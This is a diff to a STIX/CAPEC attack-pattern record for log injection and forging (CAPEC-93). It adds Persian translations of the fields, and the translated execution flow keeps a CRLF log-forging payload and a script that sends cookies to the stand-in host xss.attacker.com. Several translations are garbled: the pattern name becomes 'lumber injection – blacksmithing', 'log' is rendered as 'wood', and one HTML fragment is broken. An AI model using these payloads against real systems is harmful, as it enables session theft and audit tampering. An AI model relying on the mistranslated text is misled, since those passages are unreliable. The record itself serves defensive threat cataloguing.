@@ -9,45 +9,57 @@
                 {
                     "external_id": "CAPEC-93",
                     "source_name": "capec",
-                    "url": "https://capec.mitre.org/data/definitions/93.html"
+                    "url": "https://capec.mitre.org/data/definitions/93.html",
+                    "source_name_fa": "capec"
                 },
                 {
                     "external_id": "CWE-117",
                     "source_name": "cwe",
-                    "url": "http://cwe.mitre.org/data/definitions/117.html"
+                    "url": "http://cwe.mitre.org/data/definitions/117.html",
+                    "source_name_fa": "cwe"
                 },
                 {
                     "external_id": "CWE-75",
                     "source_name": "cwe",
-                    "url": "http://cwe.mitre.org/data/definitions/75.html"
+                    "url": "http://cwe.mitre.org/data/definitions/75.html",
+                    "source_name_fa": "cwe"
                 },
                 {
                     "external_id": "CWE-150",
                     "source_name": "cwe",
-                    "url": "http://cwe.mitre.org/data/definitions/150.html"
+                    "url": "http://cwe.mitre.org/data/definitions/150.html",
+                    "source_name_fa": "cwe"
                 },
                 {
                     "description": "J. Viega, G. McGraw, Building Secure Software, 2002, Addison-Wesley",
                     "external_id": "REF-131",
-                    "source_name": "reference_from_CAPEC"
+                    "source_name": "reference_from_CAPEC",
+                    "description_fa": "J. Viega، G. McGraw، ایجاد نرم افزار امن، 2002، ادیسون-وسلی",
+                    "source_name_fa": "مرجع_از_CAPEC"
                 },
                 {
                     "description": "A. Muffet, The night the log was forged",
                     "external_id": "REF-550",
                     "source_name": "reference_from_CAPEC",
-                    "url": "http://doc.novsu.ac.ru/oreilly/tcpip/puis/ch10_05.htm"
+                    "url": "http://doc.novsu.ac.ru/oreilly/tcpip/puis/ch10_05.htm",
+                    "description_fa": "الف. مافت، شبی که چوب جعل شد",
+                    "source_name_fa": "مرجع_از_CAPEC"
                 },
                 {
                     "description": "The OWASP Application Security Desk Reference, 2009, The Open Web Application Security Project (OWASP)",
                     "external_id": "REF-551",
                     "source_name": "reference_from_CAPEC",
-                    "url": "https://www.owasp.org/index.php/Log_Injection"
+                    "url": "https://www.owasp.org/index.php/Log_Injection",
+                    "description_fa": "مرجع میز امنیت برنامه OWASP، 2009، پروژه امنیتی برنامه وب باز (OWASP)",
+                    "source_name_fa": "مرجع_از_CAPEC"
                 },
                 {
                     "description": "Fortify Software, SAMATE - Software Assurance Metrics And Tool Evaluation, 2006--06---22, National Institute of Standards and Technology (NIST)",
                     "external_id": "REF-552",
                     "source_name": "reference_from_CAPEC",
-                    "url": "https://samate.nist.gov/SRD/view_testcase.php?tID=1579"
+                    "url": "https://samate.nist.gov/SRD/view_testcase.php?tID=1579",
+                    "description_fa": "Fortify Software، SAMATE - نرم افزار تضمین معیارها و ارزیابی ابزار، 2006--06---22، موسسه ملی استاندارد و فناوری (NIST)",
+                    "source_name_fa": "مرجع_از_CAPEC"
                 }
             ],
             "id": "attack-pattern--1dd1397d-816a-4093-86a6-cf28bb32e486",
@@ -67,6 +79,9 @@
             "x_capec_consequences": {
                 "Integrity": [
                     "Modify Data"
+                ],
+                "Integrity_fa": [
+                    "داده ها را اصلاح کنید"
                 ]
             },
             "x_capec_domains": [
@@ -84,11 +99,24 @@
             ],
             "x_capec_skills_required": {
                 "Low": "This attack can be as simple as adding extra characters to the logged data (e.g. username). Adding entries is typically easier than removing entries.",
-                "Medium": "A more sophisticated attack can try to defeat the input validation mechanism."
+                "Medium": "A more sophisticated attack can try to defeat the input validation mechanism.",
+                "Low_fa": "این حمله می تواند به سادگی اضافه کردن کاراکترهای اضافی به داده های ثبت شده (به عنوان مثال نام کاربری) باشد. افزودن ورودی‌ها معمولاً ساده‌تر از حذف ورودی‌ها است.",
+                "Medium_fa": "یک حمله پیچیده تر می تواند مکانیزم اعتبارسنجی ورودی را شکست دهد."
             },
             "x_capec_status": "Draft",
             "x_capec_typical_severity": "High",
-            "x_capec_version": "3.9"
+            "x_capec_version": "3.9",
+            "description_fa": "این حمله فایل های گزارش میزبان هدف را هدف قرار می دهد. مهاجم ورودی‌های گزارش مخرب را در فایل گزارش تزریق، دستکاری یا جعل می‌کند و به آن‌ها اجازه می‌دهد حسابرسی گزارش را گمراه کنند، آثار حمله را پوشش دهند، یا سایر اقدامات مخرب را انجام دهند. میزبان هدف به درستی دسترسی به گزارش را کنترل نمی کند. در نتیجه داده‌های آلوده منجر به فایل‌های گزارش می‌شود که منجر به شکست در قابلیت پاسخگویی، عدم انکار و قابلیت پزشکی قانونی حادثه می‌شود.",
+            "name_fa": "الوار تزریق - دستکاری - آهنگری",
+            "x_capec_example_instances_fa": [
+                "Dave Nielsen and Patrick Breitenbach PayPal Web Services (با نام مستعار PHP Toolkit) 0.50، و احتمالاً نسخه های قبلی، به مهاجمان راه دور اجازه می دهد تا ورودی های پرداخت نادرست را از طریق درخواست های HTTP POST به ipn_success.php وارد فایل لاگ کنند. همچنین ببینید: CVE-2006-0201",
+                "<xhtml:p>اگر کاربری رشته \"بیست و یک\" را برای val ارسال کند، ورودی زیر ثبت می شود:</xhtml:p>\n               <xhtml:div style=\"margin-left:1em;\" class=\"result\">INFO: val=twenty-one تجزیه نشد</xhtml:div>\n               <xhtml:p>اما، اگر یک مهاجم رشته را ارسال کند</xhtml:p>\n               <xhtml:div style=\"margin-left:1em;\" class=\"attack\">twenty and one%0a%0aINFO:+User+logged+out%3dbadguy</xhtml:div>\n               <xhtml:p>مورد زیر ثبت شده است:</xhtml:p>\n               <xhtml:div style=\"margin-left:1em;\" class=\"result\">اطلاعات: تجزیه نشد val=twenty-oneINFO: کاربر از سیستم خارج شده=badguy</xhtml:div>\n               <xhtml:p> واضح است که مهاجمان می توانند از همین مکانیسم برای درج ورودی های گزارش دلخواه استفاده کنند.</xhtml:p>"
+            ],
+            "x_capec_execution_flow_fa": "<h2> جریان اجرا </h2><div><h3>کاوش</h3><ol><li> <p> <b>تعیین فرمت فایل گزارش برنامه: </b> اولین مرحله اکتشافی است به این معنی که مهاجم سیستم را مشاهده می کند. مهاجم به دنبال اقدامات و داده هایی است که احتمالاً ثبت می شوند. مهاجم ممکن است با فرمت گزارش سیستم آشنا باشد.</p></li><table><tbody><tr><th>تکنیک‌ها</th></tr><tr><td>تعیین کنید ابزار گزارش‌گیری که توسط برنامه استفاده می‌شود (مانند log4j)</td></tr><tr><td>دسترسی به کد منبع برنامه یا فرمت فایل logtr><tr>دسترسی پیدا کنید. برای نمونه ای از برنامه و مشاهده فرمت فایل گزارش آن.</td></tr></tbody></table></ol></div><div><h3>Exploit</h3><ol><li> <p> <b>دستکاری فایل های گزارش: </b>مهاجم محتویات گزارش را مستقیماً از طریق دستکاری یا جعل در نرم افزاری که به طور غیرمستقیم از طریق نرم افزار هدف قرار می گیرد، تغییر می دهد. سیاهههای مربوط این نوع حمله معمولاً یک حمله دیگر را دنبال می‌کند و برای پوشاندن آثار حمله قبلی استفاده می‌شود.</p></li><table><tbody><tr><th>تکنیک‌ها</th></tr><tr><td>\n                  <xhtml:p> برای شروع یک خط جدید در فایل گزارش، از کاراکترهای بازگشت کالسکه و/یا تغذیه خط استفاده کنید و سپس یک ورودی جعلی اضافه کنید. به عنوان مثال:</xhtml:p>\n                  <xhtml:div style=\"margin-left:1em;\" class=\"attack\">\"%0D%0A[Thu%20Nov%2012%2011:22]:Info:%20User%20admin%20logged%20in\"</xhtml:div>\n                  <xhtml:p>ممکن است ورودی جعلی زیر را به یک فایل گزارش اضافه کند:</xhtml:p>\n                  <xhtml:div style=\"margin-left:1em;\" class=\"result\">\"[پنجشنبه 12 نوامبر 12:11:22]:اطلاعات: مدیر کاربر وارد شده است\"</xhtml:div>\n                  <xhtml:p>برنامه‌های مختلف ممکن است به رمزگذاری‌های متفاوتی از نویسه‌های بازگشت کالسکه و تغذیه خط نیاز داشته باشند.</xhtml:p>\n               </td></tr><tr><td>\n                  <xhtml:p>یک اسکریپت را در فایل گزارش وارد کنید به طوری که اگر با استفاده از یک مرورگر وب مشاهده شود، مهاجم یک کپی از کوکی اپراتور/مدیر دریافت کند و بتواند به عنوان آن کاربر به آن دسترسی پیدا کند. به عنوان مثال، یک ورودی فایل گزارش می تواند حاوی</xhtml:p> باشد\n                  <xhtml:div style=\"margin-left:1em;\" class=\"attack\"><script>new Image().src=\"http://xss.attacker.com/log_cookie?cookie=\"+encodeURI(document.cookie);</script></xhtml:div>\n                  <xhtml:p>خود اسکریپت برای کسی که گزارش‌ها را در مرورگر وب مشاهده می‌کند نامرئی خواهد بود (مگر اینکه منبع صفحه را مشاهده کند).</xhtml:p>\n               </td></tr></tbody></table></ol></div>",
+            "x_capec_prerequisites_fa": [
+                "میزبان هدف، اقدام و داده های کاربر را ثبت می کند.",
+                "میزبان هدف به اندازه کافی از دسترسی به گزارش‌ها یا مکانیسم‌های گزارش‌گیری محافظت نمی‌کند."
+            ]
         }
     ],
     "spec_version": "2.0",
